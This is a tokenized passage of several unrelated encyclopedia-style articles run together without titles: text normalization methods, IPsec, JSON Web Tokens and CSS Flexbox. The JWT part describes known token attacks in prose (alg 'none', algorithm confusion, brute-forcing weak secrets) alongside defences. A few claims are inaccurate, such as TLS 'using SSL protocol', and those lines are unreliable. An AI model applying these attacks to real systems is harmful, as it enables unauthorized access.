Beam search is used during decoding .
Zhang et al .
( 2019 ) used transformers with good results , but they are prone to unrecoverable errors .
They got better results by modifying the encoder - decoder model to capture context more effectively .
Their multi - task architecture jointly trains the tagger and the normalizer .
A memory augmented network has been applied .
A hybrid word - character attention - based encoder - decoder model has been used , with character - based component trained on adversarial examples .
A Pointer - generator network with transformer encoder and auto - regressive decoder has been used , with the pointer module replacing OOV output tokens .
For many NLP tasks in Chinese , word tokenization is not required .
However , Convolutional Neural Networks ( CNNs ) have been used .
Could you mention some useful developer tools for text normalization ?
In Python , many NLP software libraries support text normalization , particularly tokenization , stemming and lemmatization .
Some of these include NLTK , Hunspell , Gensim , SpaCy , TextBlob and Pattern .
More tools are listed on an online spreadsheet .
The Penn Treebank tokenization standard is applied to treebanks released by the Linguistic Data Consortium ( LDC ) .
This standard keeps hyphenated words together , breaks up contractions ( does n't → does and n't ) , and separates out all punctuation ( $ 10 → $ and 10 ) .
For Unicode normalization , the International Components for Unicode page links to many useful resources , including open source software .
There 's also an online demo at Unicode.org and a Unicode normalization FAQ .
In R , ` utf8_normalize ` from ` utf8 ` package does Unicode normalization .
For other text analysis , R packages ` tidytext ` , ` tm ` , ` SnowballC ` and ` topicmodels ` are useful .
Wolfram supports many levels of text normalization : character - level , word - level , sentence - level , morphological and linguistic .
An early example of text normalization in the context of Text - to - Speech ( TTS ) is in a system named MITalk .
Normalization is achieved using hard - coded rules in either Fortran or C. In the Bell Labs multilingual TTS system , Weighted Finite State Transducer ( WFST ) is used for text normalization .
Instead of doing this as a pre - processing step , normalization is done along with other linguistic tasks .
To consider context , language model transducers are used .
The method identifies many possible interpretations and selects the best path using the Viterbi algorithm .
As late as 2014 , this approach continues to be used in practice , such as in Google 's Kestrel system .
Architecture of a text normalization system .
Source : Sproat et al .
2001 , fig .
2 .
Sproat et al .
give taxonomy for NSWs .
They also treat text normalization as a language modelling problem .
For TTS applications , they present both supervised and unsupervised machine learning approaches , with the latter being a better choice for new domains .
With the growth of social media , there 's a need to normalize such texts .
From about mid-2000s , this has driven interest in text normalization for social media texts .
Aw et al .
propose the metaphor of Machine Translation ( MT ) for normalizing SMS messages .
The idea is to " translate " SMS language to English language by adapting a phrase - based statistical MT model .
For alignment during training , they use EM algorithm and Viterbi search .
They showed improved BLEU score .
They also show that downstream English to Chinese translations are improved .
Choudhury et al .
apply the Hidden Markov Model ( HMM ) to the problem of normalizing SMS messages .
Non - standard tokens are the emission states .
They also adopt the spell checking metaphor and process text at character level rather than word level .
Pennell and Liu introduce a character - level MT method .
Examples of character - level mappings are ' a'→'er ' , ' @'→'at ' , and ' 8'→'ate ' .
This is only the first phase where possible expansions are identified .
In the second phase , a language model is used to choose the correct expansion in context .
Alignment of ' ystrdy ' and ' yesterday ' using ( a ) Character - level MT ( b ) and Character - block level MT .
Source : Li and Liu 2012 , fig .
1 .
Li and Liu propose an algorithm in which the input is blocks of characters segmented by phonetic similarity .
They use a two - step MT , translating non - standard words to phones , then phones to words .
They use spell checking for simple corrections .
In example , character - level MT misaligns the second ' e ' but character - block level MT gets it right .
Previous work often treated text normalization as replacing out - of - vocabulary or non - standard words with dictionary words .
Researchers realize that text normalization ca n't be a " one - size - fits - all " approach .
Downstream NLP task or application matters .
Zhang et al .
normalize with a view to improving performance of dependency parsing rather than simply evaluating based on word error rate and BLEU score .
Wang and Ng normalize social media text for better machine translation .
Along with word replacement , they recover missing words and correct punctuation .
Baldwin and Li normalize social media texts .
They evaluate the effect of normalization on three downstream applications : dependency parsing , NER and TTS .
They also study the effect of each normalization edit on each of these applications .
For example , only word replacements are critical for NER .
For parsing , word replacements , token addition and removal edits are important .
For TTS , it 's critical to remove non - standard tokens , while word addition is important but less so .
Sproat and Jaitly present neural models for text normalization .
In particular , they use a few layers of BiLSTM .
In one architecture , they train a BiLSTM channel model to map characters to word tokens , followed by another LSTM for language modelling .
In another architecture , they use a 4-layer attention - based BiLSTM sequence - to - sequence model .
This performs better than the first one .
An FST - based filter improves results further .
Van Esch and Sproat present a revised taxonomy of NSWs .
They note that an earlier taxonomy from 2001 is inadequate due to many new categories that have come about due to social media .
They present as many as 12 tables of various semiotic classes with useful examples for each .
Some of these are word - like tokens , basic numbers , identifiers , dates , times , percentages , measures , geographic entities , and formulae .
Historical variations of the word ' their ' .
Source : Bollmann 2019 , fig .
1 .
Historical texts need to be normalized .
Bollmann evaluates and analyses the performance of three systems that do this : Norma ( rule - based , distance - based , supervised ) , cSMTiser ( CSMT with additional language modelling data ) , and Neural Machine Translattion ( NMT ) .
He considers texts from many languages , some dating back to the 14th century .
cSMTiser outperforms NMT in most cases .
Norma could be used if there 's limited training data .
It 's important to normalize NSWs correctly in spoken dialogue systems such as Amazon Alexa .
Mansfield et al .
approach this as a machine translation problem and sequence - to - sequence modelling .
For better context , they use attention mechanism on subword units rather than words .
With subwords , we reduce input size and handle OOV words better .
BPE is used to create a subword inventory and sentencepiece to find its optimal size .
They improve performance further by using linguistic features : POS , position , capitalization , and editing labels .
IPsec scenario .
Source : Stallings 2011 .
IPsec ( IP Security ) is a suite of security protocols added as an extension to the IP layer in networking .
IPsec can ensure a secure connection between two computing devices over unprotected IP networks , such as the Internet .
The nature of security threats which IPsec prevents are varied and constantly changing — such as man - in - the - middle attacks , sniffing , replay attacks .
IPsec finds applications in three security domains : Virtual Private Networks ( VPNs ) , application - level Security and routing security .
IPsec protocols cover the entire communication process – ( 1 ) Initial authentication of the two connecting devices . ( 2 ) Confidentiality of transmitted data during actual communication .
IPsec is a capability built over IP ( IPv4 and IPv6 ) by means of additional headers .
It consists of three distinct functions – authentication , confidentiality and key management .
Similar to IP itself , IPsec is an open standard maintained by the Internet Engineering Task Force ( IETF ) .
How does IPsec compare with other security techniques that exist on different OSI layers ?
IPsec vs SSL .
Source : Loshin 2019 .
Network server systems protect data on the network by supporting a variety of cryptography - based network security protocols .
Key differentiating features of these protocols are : IPsec : Supports network - level peer and data origin authentication , data integrity , data encryption , and protection .
SSL ( Secure Sockets Layer ) : does n't require pre - shared keys like in IPsec , uses public key cryptography to negotiate handshakes and securely exchange encryption keys .
Useful for bypassing firewalls and port - based traffic blocking .
TLS ( Transport Layer Security ) : Cryptographic algorithms based on cipher suite that server and client negotiate .
Uses SSL protocol .
HTTPS : Sets up encrypted link using TLS .
Data transfer is encrypted between browser and web server , preventing cyber criminals from reading or altering data .
SNMP ( Simple Network Management Protocol ) : User - based Security Model ( USM ) which provides different levels of security based on the user accessing managed information .
It uses authentication and data encryption for privacy .
OSPF ( Open Shortest Path First ) Authentication : Dynamic routing protocol .
Supports message authentication and integrity of OSPF routing messages .
Unauthorized IP resources can not inject messages into the network without detection .
Ensures integrity of routing tables in the OSPF routing network .
What 's the architecture of the IPsec protocol suite ?
IPsec architecture .
Source : Worthman 2015 .
IPsec specifies procedures , components , their inter - relationship and the general process required to provide security services at the IP layer .
IPsec is a suite of three transport - level protocols used for authenticating the origin and content of IP packets and optionally for data payload encryption .
Applications can invoke IPsec on IP datagrams that are security enabled in the IPsec global policy file at system - wide or per - socket level .
Key components of IPsec architecture include : Security Associations ( SA ) : Specifies security properties recognized by communicating hosts .
Hosts require two SAs to communicate securely , one for each direction .
Prior to transmission of protected datagrams , they agree upon specific security protections , cryptographic algorithms , secret keys to be applied and specific types of traffic to be protected .
IPsec Protocols : AH ( Authentication Header ) and ESP ( Encapsulating Security Payload ) protocols are for authentication .
They contain proof of data source , data integrity and anti - replay protection .
The third protocol , IKE ( Internet Key Exchange ) , is a hybrid protocol used for peer authentication and key exchange processes before actual data transfer begins .
IPsec modes : Both protocols ( AH & ESP ) support two modes - transport mode & tunnel mode .
What are the services offered by IPsec ?
IPsec offers a number of services : access control , connectionless integrity , data origin authentication , rejection of replayed packets , confidentiality ( encryption ) , and limited traffic flow confidentiality .
What are the primary applications of IPsec ?
IPsec for remote access using VPN .
Source : Perle 2021 .
IPsec enables secure communication over the Internet , independent from the application or higher protocols .
It supports network layer security , but it 's compatible with schemes providing security at the application layer .
It provides secure communication across LAN , private / public WAN and the Internet .
( 1 ) An enterprise may establish a secure VPN connection over a public WAN or Internet .
IPsec minimises the need for a private network and hence saves costs .
Ensures authentication , confidentiality and encryption .
Application scenarios include : Secure connection between head office and branches ( client - server ) Different branches ( peers ) of the same company . Workers connect to the company intranet remotely . Intranet or extranet connectivity with partners ( partner organizations , payment gateways , third party transactions ) ( 2 ) Security for e - commerce applications , mainly B2B. IPsec enhances existing application - level security features .
Customer - oriented commerce is primarily web based and uses SSL .
( 3 ) Network diagnostics for debugging connections .
A tunnel is initiated with a ping from the remote device .
( 4 ) IPsec usage on a 4 G network , simple end - to - end implementation between the mobile device and the services network peer ( security gateway , server or another peer ) .
What are the security protocols in the IPsec suite ?
AH and ESP packet structure .
Source : Kosem 2018 .
The IPsec protocol suite mainly consists of these protocols : Authentication Header ( AH ) : AH is an extension header to provide data integrity , authentication and anti - replay , but it does n't provide encryption .
Anti - replay protection ensures partial sequence integrity and protects against unauthorized transmission of packets .
Implements strong hashing algorithms to provide data integrity .
AH does n't provide data confidentiality .
Encapsulating Security Payload ( ESP ) : ESP consists of an encapsulating header and trailer .
It provides all that AH offers ( data integrity , encryption , authentication and anti - replay ) .
It additionally provides authentication for payload data using symmetric key encryption .
It uses encryption algorithms such as GCM , DES , 3DES , and AES .
The set of services provided depends on options selected at the time of Security Association ( SA ) establishment and location of the implementation in a network topology .
Internet Key Exchange ( IKE ) : IETF - specific key managing protocol for exchanging and negotiating security policies .
Supports manual or dynamic association of management in cryptographic keys .
It can be used outside IPsec as well .
Cryptographic algorithms : For encryption , message authentication , pseudorandom functions ( PRFs ) , and cryptographic key exchange .
Can you explain the different authentication modes in IPsec ?
IPsec authentication modes .
Source : Huawei 2021 .
For authentication , both AH and ESP support two modes of use : transport and tunnel mode .
Authentication can be applied to the entire original packet ( tunnel mode ) or to the packet contents except the IP header ( transport mode ) .
Transport Mode : Client to client .
It covers most of the original packet .
The original IP packet is used with ESP and AH Headers , then the original IP Header is reused in front of ESP and AH Headers .
This mode does n't change the IP packet header .
Only the IP protocol field is changed to 51 ( AH ) or 50 ( ESP ) , and the checksum of IP packet header is recalculated .
This mode is used when we have end - to - end control of the network , so that there will be no packet manipulation through the network .
Tunnel Mode : Covers the entire original packet .
Inserts the original packet into a new IP packet . A new IP Header is added in front of the ESP and AH Headers .
The original IP packet header is hidden .
This mode is used in communications between VPN gateways or between a host and a VPN gateway .
Tunnel Mode is the default option .
How does IPsec implementations vary between IPv4 and IPv6 ?
Security features of IPv4 and IPv6 compared .
Source : Hoffman 2021 .
Security concerns were raised over IPv4 .
As a result , IPsec was first developed for the newest version of Internet Protocol ( IPv6 ) , then retrospectively added for IPv4 .
It was included as a mandatory feature in the IPv6 standards whereas it 's optional and must be supported externally in IPv4 .
By design , IPv6 is more secure from IP address scanning attacks , as its address space is huge .
So IP scanning techniques on networks may not work to find possible computers with security vulnerabilities , as it could take years .
IPsec in IPv4 is widely used for VPNs .
These are terminated at the edge of networks .
In IPv4 , IPsec is generally not used to secure end - to - end traffic because of the widespread use of Network Address Translation in IPv4 , called NAT44 .
NAT mangles the IPv4 headers and breaks IPsec .
This restriction does n't exist in IPv6 , so that using IPsec end - to - end becomes more practical .
What are the disadvantages of IPsec ?
Over - reliance on public keys : If a network has poor key management or the integrity of the keys is compromised , then the IPsec security factor is lost .
Performance overhead : High CPU usage because all data that passes through the server has to be encrypted and decrypted .
When the data packet size is small , network performance suffers due to large IPsec overhead .
may need to use hardware appliances such as VPN Concentrators .
Wide access range of privileges : Giving access to a single device on an IPsec - based network can give access privileges to other devices too .
So if any device on a home network is compromised , it might affect the corporate network that is connected to the home network ( through the IPsec tunnel ) .
Implementation complexity : IPsec contains many options and high flexibility , which makes it popular .
But it also adds to its complexity .
Network compatibility issues : When we are connected to an IPsec - based VPN , we ca n't connect to another network due to restrictions on firewalls .
Also , IPsec does n't provide support for multi - protocol and IP multicast traffic .
The first formal standard ( or public ) version of IPv4 is created as TCP / IP v4 and defined in RFC 760 .
The IETF group for defining the IP security protocol ( IPsec ) is constituted .
It actively started functioning in 1993 .
Network Address Translator ( NAT ) is published on RFC 1631 .
NAT is a technology used to prolong IPv4 availability .
It works by translating a private address in an internal network into legal public addresses .
IPsec protocols are formally defined and published on RFC 1825 through RFC 1829 .
IETF published the IPv6 specification to overcome the limitations of IPv4 .
IETF initiated the design and development of IPv6 back in 1994 .
Also , in 1998 , IPsec protocol definitions were superseded by RFC 2401 and RFC 2412 .
The mutual authentication and key exchange protocol Internet Key Exchange ( IKE ) is added to IPsec to create and manage Security Associations .
The latest version of the IPsec protocol suite has been released with important updates to IKE and ESP protocols , as defined in RFC 4301 and RFC 4309 .
These documents standardize the abbreviation of IPsec to uppercase " IP " and lowercase " sec " .
An IPsec Maintenance and Extensions ( ipsecme ) working group has been formed at the IETF .
JWT logo .
Source : Woloski 2015 .
JSON is a data format commonly used in web applications .
The JSON Web Token ( JWT ) is a mechanism that brings security to JSON data .
JSON grew in adoption from the mid-2000s .
This influenced the adoption of JWT .
Compared to alternatives such as XML or SAML , app developers found JWT easier to implement and use .
JWTs are less verbose and more secure .
By the late 2010s , JWTs were widely used in the world of cloud computing and microservices .
JWT is available in two formats : JSON Web Signature ( JWS ) and JSON Web Encryption ( JWE ) .
JWS offers protection against data tampering ( integrity ) .
JWE prevents others from reading the data ( confidentiality ) .
Moreover , developers have a choice of various keys and algorithms to protect JSON data in either of these formats .
IETF has published the main RFCs that cover JWTs .
There are also plenty of open source implementations in many languages .
How does JWT bring security to the web ?
A typical authorization use case of JWT .
Source : Calandra 2019 , fig .
5 .
Consider an application consisting of many services exposed to clients via APIs .
We certainly do n't want clients to authenticate with each service .
Authentication is done by a specific service or server .
Once authenticated successfully , the client should be able to access any of the services without further authentication .
This is where JWTs can help .
For example , in AWS , Amazon Cognito does authentication .
An authenticated client is issued a JWT .
Whenever the client makes an API request , it presents this token .
The API gateway validates the token before allowing the client to access the requested service .
Thus , all relevant information is within the JWT .
The API gateway need not contact the authentication server to determine if the client should be allowed access .
For authorized access , privileges can be set within the token .
For example , the name - value pair ` admin : true ` could be set to allow deletion of records and other admin operations .
Moreover , such privileges are set when the token is issued .
The client or third - party hackers ca n't tamper with the token .
What are some use cases where JWT can be used ?
The common use of JWTs is authorization .
For example , APIs often require an access token and this could be a JWT .
Systems implementing Single Sign - On ( SSO ) can issue JWTs to allow the user to access various services .
Assume a server authenticates a user and issues a single - use short - lived JWT .
A user uses this token to download a file from another server .
In this example , JWT temporarily authorizes the user to download a protected resource .
In microservices architecture , JWTs are used to pass authorization across services .
OAuth 2.0 access tokens are JWTs .
JWTs can be used for authentication .
For example , in OpenID Connect ( OIDC ) , users login with a JWT .
Another example is to authenticate a SOAP request with JWT rather than SAML2 assertion .
In Oracle Cloud , the API gateway authenticates an API client based on the JWT it receives .
Once validated , claims in the token are used to authorize the client .
JWTs can be used to authenticate SPAs .
Due to their protection against tampering and snooping , JWTs are a means to exchange information securely .
What are the main components of a signed JWT ?
A signed JWT has three components .
Source : Danyal 2020 .
A JWT has two essential components : header and payload .
In practice , JWTs are signed , that is , they include a signature .
This is what we call JWS .
Thus , the three main components of a signed JWT are : the Header , which specifies the type of token ( typically ` JWT ` ) and the algorithm used .
Payload : The main content of the token that includes a set of claims .
Signature : This is computed from header and payload to protect the integrity of the token .
The header and payload are JSON objects .
However , these are not transmitted as such .
They are Base64-URL encoded , which is similar to Base64 encoding except that characters special to URLs are replaced : ` + ` becomes ` - ` , ` / ` becomes ` _ ` .
Signature is computed as ` BASE64URL(UTF8(JWS Protected Header ) ) || ' .
' || BASE64URL(JWS Payload ) ` and then Base64-URL encoded .
The JWS is constructed by concatenating header , payload , and signature .
Period character separates the fields .
We can represent this as ` BASE64URL(UTF8(JWS Protected Header ) ) || ' .
' || BASE64URL(JWS Payload ) || ' .
' || BASE64URL(JWS Signature ) ` .
This format of JWS is called JWS Compact Serialization .
There 's also JWS JSON Serialization that can have multiple signatures .
What are JWT claims and how to specify such claims ?
Claim set in an example JWT issued by Amazon Cognito .
Source : AWS 2020 .
The payload of a JWT has a set of claims .
A claim is a name - value pair .
It states a fact about the token and its subject , such as username or email address .
Claims are not mandatory since JWTs are meant to be compact .
It 's up to applications to include claims that matter .
Some claim names are registered with IANA .
Examples include " iss " ( issuer ) , " sub " ( subject ) , and " aud " ( audience ) .
Some registered claim names are of datetime type : " exp " ( token expires at this time ) , " nbf " ( token ca n't be used before this time ) , and " iat " ( time when token was issued ) .
For example , ` " exp":1300819380 ` says that the token expires at the specified timestamp .
There are also public or private claim names .
These are application specific and their semantics are agreed between producer and consumer of the token .
Public names must be collision - resistant .
For example , a name based on a domain name or Universally Unique IDentifier ( UUID ) is unlikely to collide with another public name .
Is it possible to encrypt the payload in a JWT ?
Illustrating a nested JWT .
Source : Kawasaki 2017 .
A signed token can be read by anyone .
The purpose of the signature is to prevent hackers from tampering with the header or payload .
Any changes to these would result in a different signature , which the attacker ca n't create without the secret key .
Such tampering would cause a failure during signature verification .
If the intention is to send a sensitive payload , signature alone is inadequate .
There 's a need to encrypt the payload .
This is where the JWE format becomes relevant .
Encryption of content uses symmetric keys .
However , these keys need not be shared in advance .
They can be generated dynamically and exchanged within JWE .
However , the shared symmetric key is encrypted using an asymmetric private - public key pair .
It 's also possible to do both , such as a JWS within a JWE or vice versa .
Such as token is called Nested JWT .
For example , we could create a JWS as usual and encrypt it .
This then becomes the encrypted payload of a JWE .
A simpler approach is to use only encryption algorithms mentioned in JWA , since they also provide integrity protection .
Which are the various algorithms supported by JWT ?
Use of symmetric and asymmetric keys for JWS .
Source : Pragmatic Web Security 2020 .
Both symmetric and asymmetric algorithms are supported for signing and encrypting tokens .
In fact , this support for a variety of algorithms is perhaps one reason for the wider adoption of JWTs .
For JWS , at the minimum , an implementation should support HMAC using SHA-256 .
This uses a shared symmetric key .
For the " alg " header parameter , its value is " HS256 " .
Apart from HMAC for signature , we can have digital signatures using asymmetric keys with RSASSA - PKCS1-v1_5 , ECDSA , or RSASSA - PSS .
Signing is done with a private key .
Verification happens with the public key .
For content encryption in JWE , at the minimum , an implementation should support A128CBC - HS256 and A256CBC - HS512 .
The A128CBC - HS256 does AES encryption in CBC mode with 128-bit IV value , plus HMAC authentication using SHA-256 and truncating HMAC to 128 bits .
The encryption key is called Content Encryption Key ( CEK ) .
The CEK itself is encrypted using other algorithms and included in the JWE .
Some of these are RSA - OAEP , A128KW , ECDH - ES , ECDH - ES+A128KW , and more .
It 's also possible to use a shared symmetric key as CEK .
Can I use JWTs as a replacement for session objects ?
With session objects , the server maintains the status of each logged - in user , who gets a session ID via a HTTP cookie .
Subsequent requests contain the session ID .
The server uses it to retrieve the session object and serve the client .
Thus , stateless HTTP calls are strung together into a stateful session .
With JWTs , the server does n't need to store session state .
All relevant information is contained in the JWT .
This also makes it convenient to deploy on a distributed architecture .
One server might issue a JWT .
Subsequent client requests could be served by another server via a load balancer .
While JWTs seem attractive , a JWT takes more space compared to a session ID .
Even without session objects , most client requests will still need access to the database , implying that JWTs do n't improve performance .
Most web frameworks automatically sign session cookies , implying that signing a JWT is n't really an advantage .
JWTs stored in local storage can be less secure .
We ca n't invalidate individual JWTs or deal with stale claims in the token .
For these reasons , use of JWTs as an alternative to session IDs is not recommended .
Which are the known vulnerabilities of JWT ?
JWT without audience misused to gain access to Org2 .
Source : Peyrott 2018 , fig .
8.2 .
Most attacks on JWT are due to implementations rather than its design .
Some early implementations used the " alg " value in the header to verify the signature .
An attacker could set the value to " none " ; or change " RS256 " to " HS256 " and use the public key as the shared secret key to generate a valid signature .
Based on the " alg " value , the consumer would skip verification or incorrectly find that the signature is valid .
Brute force attacks on HS256 are simple if the shared secret key is too short .
Another possible oversight in implementations is not verifying the claims or not including adequate claims .
For example , a token without audience is issued to Org1 but the attacker could present the same token to Org2 can gain access if that username exists in both organizations .
Do n't store sensitive information on JWS , that is , in unencrypted form .
Do n't also assume that encrypted data ca n't be tampered with .
RFC8725 details many vulnerabilities and best practices to overcome the same .
What are some best practices when using JWT ?
Pick strong keys .
These are often long and created by cryptographic - quality pseudo - random number generators ( PRNGs ) .
Do n't use human - readable shared secret keys .
For federated identity , or when third - party services are involved , it 's inconvenient and unsafe to use a shared secret .
Instead , use public - private key pair .
Do n't rely on the header to select the algorithm for verifying the signature .
Use libraries that allow for explicit selection of algorithms .
It 's good practice to verify applicable claims .
For example , verify that the token has not expired .
In AWS we might verify that the audience claim matches the app client ID created in the Amazon Cognito user pool .
Where nested tokens are used , verify signature on all tokens , not just on the outermost token .
Use different validation rules for each token .
Avoid key reuse for different tokens .
For example , we could use different secret keys for each subsystem .
Using the " kid " claim , we could identify which secret key is used by the token .
Keep the lifetime of tokens short , say for a few minutes or hours .
In addition , we could include a nonce in the token to prevent replay attacks ( which is what OpenID Connect does ) .
Could you mention some resources concerning JWT ?
IETF documents relevant to JWT include RFC7519 : JSON Web Token ( JWT ) , RFC7515 : JSON Web Signature ( JWS ) , RFC7516 : JSON Web Encryption ( JWE ) , RFC7517 : JSON Web Key ( JWK ) , RFC7518 : JSON Web Algorithms ( JWA ) , and RFC7797 : JSON Web Signature ( JWS ) Unencoded Payload Option .
IANA 's JOSA page contains lists of registered header parameter names and algorithm names .
Peyrott 's JWT Handbook is worth reading .
This book includes JavaScript code with explanations , which is a useful reference for developers .
Another useful reference is a JWT cheatsheet published by Pragmatic Web Security .
For a simpler approach , developers can use third - party JWT libraries .
These are available in many languages .
Lists of JWT implementations are available at OpenID and at jwt.io .
The site jwt.io offers a debugger to paste a JWT and view its decoded form .
Optionally , signature verification is possible if you include the secret key .
Douglas Crockford and Chip Morningstar sent out what is historically the first JSON message .
Since JSON is nothing more than plain JavaScript , Crockford himself states that this message format was probably in use as early as 1996 .
In July 2006 , Crockford describes in RFC 4627 the JSON format and its MIME media type ` application / json ` .
From the mid-2000s , the growth of Web 2.0 and the use of REST APIs in web apps led to wider adoption of JSON .
The term AJAX itself was coined in 2005 , but it 's clear that AJAX is not limited to XML : JSON can be used instead .
By the late 2000s , with the increasing use of JSON on the web , it was recognized that standards were needed to offer security services in the JSON format .
As an Internet - Draft , JSON Web Token ( JWT ) is published on IETF .
This document goes through multiple revisions , with the final draft revision appearing in December 2014 .
In May 2015 , it became RFC7519 .
At IETF , the Javascript Object Signing and Encryption ( JOSE ) Working Group has been formed .
For better interoperability , the group aims to standardize the mechanism for integrity protection ( signature and MAC ) , encryption , the format of keys and algorithm identifiers .
IETF publishes RFC7519 : JSON Web Token ( JWT ) as a Proposed Standard .
Other relevant RFCs are also published in the same month : RFC7515 : JWS , RFC7516 : JWE , RFC7517 : JWK , RFC7518 : JWA .
On Auth0 blog , a new logo for JWT was announced along with a redesigned website at jwt.io .
The blog post also notes that interest in JWT has been increasing since 2013 .
By now , there are 972 JWT - related GitHub repositories and 2600 + threads on StackOverflow .
It 's also claimed that , if you use Android , AWS , Microsoft Azure , Salesforce , or Google , then chances are that you are already using JWT .
Illustrating unencoded payload specified in RFC7797 .
Source : Jones 2016 , sec .
4 .
IETF publishes RFC7797 : JSON Web Signature ( JWS ) Unencoded Payload Option as a Proposed Standard .
Typically , JWT payload is Base64-URL encoded .
This document gives the option of skipping this encoding step .
For example , a payload ` $ .02 ` is sent as it is rather than sending its encoded form of ` JC4wMg ` .
The header parameter " b64 " controls the use of this option and the " crit " parameter facilitates backward compatibility .
JWT is split between local storage and cookie .
Source : Ideneal 2019 .
JWTs stored in local or session storage are vulnerable to XSS attacks .
On the other hand , JWTs stored in cookies are vulnerable to CSRF attacks .
One blogger proposes to mitigate the risks by storing the signature in a HttpOnly , SameSite , Secure cookie .
The JWT header and payload are in local storage and transferred to the HTTP header as a bearer token .
The application server has to assemble the complete JWT from its parts .
HttpOnly cookies are inaccessible to JavaScript .
Simple use of CSS Flexbox .
Source : Brennan 2015 .
In web design , the traditional way to layout elements on a page is to use CSS properties such as ` float ` , ` clear ` , and ` display ` .
In particular , the ` display ` property has values ` inline ` , ` block ` , ` inline - block ` , and ` table ` that help with layout .
CSS Flexbox is an easier method to do layouts .
With a flexbox , items are laid out within a parent container .
The flexbox makes it easy to distribute or fill extra spaces within the container .
It 's also possible to shrink the items dynamically to prevent overflows .
We can also wrap items within the container to obtain a multiline flow .
This " flexing " of items is an important aspect of the flexbox that makes the design responsive to device dimensions .
Site header , side bar , centered prompt , tabs , and form footer are some examples where flexbox can be used .
What are the essential terms pertaining to CSS Flexbox ?
Basic terms used in CSS Flexbox Layout .
Source : Atkins et al .
2018 , fig .
2 .
The flexbox layout involves a parent element that defines how to lay out its child elements .
The parent is called a flex container and its children are called flex items .
CSS declarations ` display : flex ` or ` display : inline - flex ` specify the use of flexbox .
Flex direction determines if flex items are laid out horizontally or vertically .
In either case , the direction in which items are laid out is called the main axis .
Its perpendicular axis is called the cross axis .
The container 's boundaries are called main - start , main - end , cross - start and cross - end .
Items are placed from start to end boundaries .
Normally , this is in left - to - right and top - to - bottom order .
However , the order gets reversed if ` flex - direction ` has values ` row - reverse ` or ` column - reverse ` .
Also , the main axis and cross axis can get swapped depending on the current writing mode .
Container dimensions are called main size and cross size .
CSS properties ` width ` , ` height ` and their min / max equivalents are applicable to the container .
Which are the main CSS properties to control layout in the CSS Flexbox ?
In the flex container , the main CSS properties are : display : flex | flex - inline flex - direction : row | row - reverse | column | column - reverse flex - wrap : nowrap | wrap | wrap - reverse flex - flow : a shorthand for ' flex - direction || flex - wrap ' justify - content : flex - start | flex - end | center | space - between | space - around align - items : flex - start | flex - end | center | baseline | stretch align - content : flex - start | flex - end | center | space - between | space - around | stretch On flex items , main CSS properties are : order : integer flex - grow : number flex - shrink : number flex - basis : content | ' width ' flex : a shorthand for ' none | [ flex - grow flex - shrink ?
|| flex - basis ] ' align - self : auto | flex - start | flex - end | center | baseline | stretch An article on CSS - Tricks visually depicts the use of these properties .
It 's recommended to use shorthand forms ` flex - flow ` and ` flex ` .
What does it mean to grow or shrink flex items ?
Illustrating the use of ' flex ' CSS property .
Source : Devopedia 2020 .
Along the main axis , flex items might not fill the container 's main size .
We could use ` justify - content ` to distribute the leftover space ; or increase the size of items to fill the extra space .
On the other hand , if items are too big for the container , we could shrink the items to avoid overflow .
In ( b ) , all items are grown in equal proportion to fill up the extra space .
In ( c ) , green items retain their original size while orange items grow .
In ( d ) , green items grow relative to orange items at a ratio of 3:1 .
Interestingly , this results in orange items shrinking below their original size .
In ( e ) and ( f ) , items are wider and would overflow the container ; but they do n't overflow since wrapping is enabled .
Since the container is 500px wide and each item is 120px wide , we would expect the first row to contain four items .
However , the effect of padding ( 8 x 5px ) results in only three items in the first row .
Item width ( or height for column - wise layout ) and its min / max values also affect how items can be resized .
How can I align and justify items in a CSS flexbox container ?
Illustrating how to align and justify flexbox content .
Source : Ferreira 2018 .
Along the main axis , ` justify - content ` controls how items are laid out and extra spaces are distributed .
For example , ` justify - content : flex - start ` aligns content to main - start .
Excess space , if any , is towards main - end ; ` justify - content : center ` puts leftover space towards both main - start and main - end ; ` justify - content : space - between ` , ` justify - content : space - around ` , and ` justify - content : space - evenly ` distribute leftover space between or around all items .
Along the cross axis , ` align - items ` controls the alignment .
For example , ` align - items : center ` centers items ; ` align - items : stretch ` stretches items to fill the container 's cross size ( if set ) or match the longest item .
When wrapping is enabled , ` align - content ` becomes relevant .
Like ` align - items ` , it affects alignment and spacing along the cross axis .
Container property ` align - items ` can be overridden by individual items with ` align - self ` .
For example , we can align all items to cross - start ( ` align - items : flex - start ` ) and one particular item to cross - end ( ` align - self : flex - end ` ) .
How do I use the ' order ' property of CSS Flexbox ?
Illustrating the use of ' order ' CSS property .
Source : Devopedia 2020 .
Flex items can be assigned to ordinary groups , with each group given an integer .
Within the container , items are rendered based on this order , from lower to higher numbers .
This is useful because the ordering of items need not be changed in the source document .
Ordering can be controlled from CSS .
An example use case is a tabbed interface .
If we wish the active tab to be the leftmost tab ( main - start ) , then we can set ` .tabs > .current { order : -1 ; } ` .
All other tabs have the default value of zero .
However , ordering items this way is only visual ordering .
The logical ordering is still specified by the order in the source document .
Logical ordering is what matters for accessibility , such as , navigating the items via tab keys .
What are some tips and tricks for using CSS Flexbox ?
An example showing grid items as flex parents .
Source : Rendle 2017 .
The CSS Flexbox is primarily for 1-D layouts .
Via nesting or wrapping , it 's possible to achieve 2-D flexbox layouts .
An excellent approach is to combine both CSS Grid and CSS Flexbox , thus leveraging the best of both worlds .
Properties ` justify - content ` and ` align - items ` are useful in such an approach .
Flex containers do not block elements .
CSS properties ` float ` , ` clear ` and ` vertical - align ` have no effect on flex items .
Property ` overflow ` is applicable to the container .
It 's possible to overlap flex items using negative margins or absolute positioning .
Beau Carnes has published informative visualizations of how CSS Flexbox works .
Flexbox Patterns are a useful resource where beginners can study many flexbox examples .
W3C publishes a working draft of CSS Flexible Box Layout or Flexbox .
After multiple revisions , the first Candidate Recommendation for Flexbox was released in September 2012 .
W3C publishes the first Candidate Recommendation for CSS Flexible Box Layout Module .
A flexbox layout can be specified with ` display : flex ` .
However , the initial draft of July 2009 used ` display : box ` and a later draft of March 2012 used ` display : flexbox ` .
Older browsers might not support the currently standardized CSS rule and fallback techniques may be required .
W3C publishes as a Candidate Recommendation CSS Flexible Box Layout Module Level 1 .
As of December 2020 , the latest version of this document is from November 2018 .
W3C publishes CSS Grid Layout Module Level 1 as a Candidate Recommendation .
Whereas CSS Flexbox is limited to one - dimensional layouts , CSS Grid can handle two - dimensional layouts .
Designers view CSS Grid as not replacing but complementing CSS Flexbox .
For example , we can do a flexbox layout within a grid layout or vice versa .
To become a good web designer / developer , it 's not enough to know CSS properties and their values .
We need to know the contexts in which each property - value pair is applicable , how results differ in different contexts , and how various properties interact .
